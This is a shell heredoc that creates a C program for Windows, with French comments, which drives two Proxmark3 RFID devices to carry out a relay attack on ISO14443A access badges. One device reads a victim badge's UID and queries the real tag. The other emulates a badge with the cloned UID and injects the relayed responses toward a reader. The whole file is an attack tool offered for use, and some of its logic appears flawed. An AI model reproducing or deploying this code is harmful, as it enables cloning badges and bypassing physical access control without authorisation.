cat << 'EOF' > bridge.c
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <ctype.h>

#define PM3_MOLE  "COM9"  
#define PM3_PROXY "COM10" 
#define PM3_PATH  "client\\proxmark3.exe"

// Parse les données hexadécimales entre les pipes | |
void parse_pm3_hex(const char* line, char* out) {
    int pipe_count = 0;
    int j = 0;
    for (int i = 0; line[i] != '\0'; i++) {
        if (line[i] == '|') {
            pipe_count++;
            continue;
        }
        if (pipe_count == 3) { // Colonne DATA
            if (isxdigit(line[i]) || line[i] == ' ') {
                out[j++] = line[i];
            }
        }
        if (pipe_count >= 4) break;
    }
    out[j] = '\0';
    int len = strlen(out);
    while (len > 0 && isspace((unsigned char)out[len - 1])) out[--len] = '\0';
}

void get_uid_from_mole(char* out_uid) {
    char cmd[256];
    sprintf(cmd, "%s %s -c \"hf 14a info\"", PM3_PATH, PM3_MOLE);
    FILE* fp = _popen(cmd, "r");
    if (!fp) return;
    char line[256];
    while (fgets(line, sizeof(line), fp)) {
        char* p = strstr(line, "UID :");
        if (!p) p = strstr(line, "UID:");
        if (p) {
            char* start = strstr(p, ":") + 1;
            int j = 0;
            for(int i=0; start[i] != '\0' && j < 31; i++) {
                if (isxdigit(start[i])) out_uid[j++] = start[i];
            }
            out_uid[j] = '\0';
        }
    }
    out_uid[out_uid[14] == '\0' ? 14 : 14] = '\0'; // Ensure null termination at position 14
    _pclose(fp);
}

// Fonction d'échange adaptée à tes flags : -a (active) et -c (crc)
void exchange_data(const char* port, const char* cmd_raw, char* out_data, int use_crc) {
    char cmd[512];
    char buffer[1024];
    out_data[0] = '\0';
    
    // Si use_crc est vrai, on ajoute -c, sinon non (pour éviter le double CRC)
    if (use_crc)
        sprintf(cmd, "%s %s -c \"hf 14a raw -a -k -c %s\"", PM3_PATH, port, cmd_raw);
    else
        sprintf(cmd, "%s %s -c \"hf 14a raw -a -k %s\"", PM3_PATH, port, cmd_raw);

    FILE* fp = _popen(cmd, "r");
    if (fp) {
        while (fgets(buffer, sizeof(buffer), fp)) {
            if (strstr(buffer, "|")) {
                parse_pm3_hex(buffer, out_data);
            }
        }
        _pclose(fp);
    }
}

int main() {
    char uid[33] = {0};
    char tag_response[256] = "";

    system("taskkill /IM proxmark3.exe /F >nul 2>&1");
    printf("=== RELAI ACTIF (FLAGS: -a -c) ===\n\n");

    get_uid_from_mole(uid);
    if (strlen(uid) == 0) {
        printf("[!] Badge non detecte.\n");
        return 1;
    }
    printf("[+] UID clone : %s\n", uid);

    // Initialisation simulation
    char init_sim[512];
    sprintf(init_sim, "start /B %s %s -c \"hf 14a sim -t 7 -u %s\"", PM3_PATH, PM3_PROXY, uid);
    system(init_sim);
    Sleep(2000);

    while(1) {
        printf("\n[READER] Tentative de relai (REQA)...");
        
        // 1. Mole interroge le badge réel (26 = REQA, on demande au PM3 de calculer le CRC avec -c)
        exchange_data(PM3_MOLE, "26", tag_response, 1);

        if (strlen(tag_response) > 0) {
            printf("\n[TAG] Repond : %s", tag_response);
            
            // 2. Proxy injecte la réponse vers le lecteur
            // Comme tag_response contient déjà les octets de réponse, on n'ajoute pas -c ici
            char dummy[256];
            printf("\n[PROXY] Injection...");
            exchange_data(PM3_PROXY, tag_response, dummy, 0);
            printf(" OK.");
        }

        printf("\n--- Attente 3s ---\n");
        Sleep(3000);
    }
    return 0;
}
EOF